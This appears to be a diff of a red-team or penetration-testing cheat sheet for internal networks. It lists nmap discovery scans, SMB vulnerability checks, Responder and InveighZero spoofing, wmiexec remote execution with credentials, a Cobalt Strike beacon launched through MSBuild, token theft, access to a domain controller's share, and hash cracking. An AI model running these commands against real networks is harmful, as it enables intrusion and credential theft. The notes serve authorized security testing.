@@ -1,13 +1,21 @@
-*Host Discovery*
+Initial Host Discovery
+---------------------------------------------------------------
 sudo nmap -oA live_hosts --stats-every 60s --log-errors --traceroute --reason --randomize-hosts -v -R -PE -PP -PM -PO -PU -PY 80,23,443,21,22,25,3389,110,445,139,53,135,3306,8080,1723,111,995,93,5900,1025,587,8888,199,1720,465,548,113,81,6001,10000,514,5060,179,1026,2000,8443,8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646 -PA  80,23,443,21,22,25,3389,110,445,139,53,135,3306,8080,1723,111,995,93,5900,1025,587,8888,199,1720,465,548,113,81,6001,10000,514,5060,179,1026,2000,8443,8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646 -sS -sV -p 21,22,23,25,80,443,445,8080,8443 -iL scope.txt
 
+SMB Common Vuln Checks
+---------------------------------------------------------------
 --script smb-vuln-ms17-010
 --script smb-vuln-ms08-067
+
+Additional Host Discovery - Recheck
+---------------------------------------------------------------
 
 nmap -sP -PA21,22,25,3389 192.168.2.1/24 
 sudo nmap -sP -PS22,3389 192.168.2.1/24 
 sudo nmap -sP -PU161 192.168.2.1/24 
 
+Host Discovery of 6 most common ports
+---------------------------------------------------------------.
 sudo nmap -sP -PS21,22,80,139,445,3389
 
 Fast Live host discovery trick (checks only .1 on subnet):
@@ -40,28 +48,36 @@ To find out which NMAP .NSE script ran from above:
 cat services/full-sweep.nmap |grep '|_' | cut -d '_' -f2 | cut -d ' ' -f1 | sort -u | grep ':'
 for just HTTP targets: cat full-sweep.nmap | grep -i http-title
 
-*Common RCE Ports*
+Common RCE Ports
+---------------------------------------------------------------
 nmap -oA commonRCE -iL live_hosts.txt -p 1090,1098,1099,4444,11099,47001,47002,10999,7000-7004,8000-8003,9000-9003,9503,7070,7071,45000,45001,8686,9012,50500,4848,11111,4445,4786,5555,5556 --open
 
-*Common Web Ports*
+Common Web Ports
+---------------------------------------------------------------
 nmap -p 80,443,8443,8080,8081,8444,8000,8100,8082,8001,8002,8500,8888,9000,8200,9000,8200,8008,8181,8900,8009 -iL live_hosts.txt -oA common_web_ports --open
 
-*Using Aquatone to visualize*
+Using Aquatone to visualize
+---------------------------------------------------------------
 cat common_web_ports.xml | .\aquatone.exe -nmap -chrome-path "C:\Program Files\Google\Chrome\Application\Chomre.exe" -out C:\Users\Magic\Desktop\aquatone
 
-*InveighZero*
+InveighZero
+---------------------------------------------------------------
 C# man-in-the-middle spoof LLMNR,NBNS,mDNS,DNS, and DHCPv6.
 
-*responder*
+responder
+---------------------------------------------------------------
 sudo /usr/sbin/responder -I eth0
 
-*Bloodhound*
+Bloodhound
+---------------------------------------------------------------
 Check unrolled RDP rights for all compromised users
 
-*Remote Interaction*
+Remote Interaction
+---------------------------------------------------------------
 python3 wmiexec.py domain/user:password@remotecompany.corp.com
 
-*Cobalt Strike Beacon*
+Cobalt Strike Beacon.
+---------------------------------------------------------------
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild msbuild_x64.xml
 
 From cobalt strike:
@@ -72,13 +88,16 @@ steal_token *first######*
 
 shell dir \\domaincontroller.comp.com\C$
 
-*Check for AutoLogon Files*
+Check for AutoLogon Files
+---------------------------------------------------------------
 
 Credninja to test if compromised credentials have local administrator rights
 
-*Check egress*
+Check egress
+---------------------------------------------------------------
 Egress-Access
 Cobalt strike
 
-*hashcracking*
+hashcracking
+---------------------------------------------------------------
 GoCrack
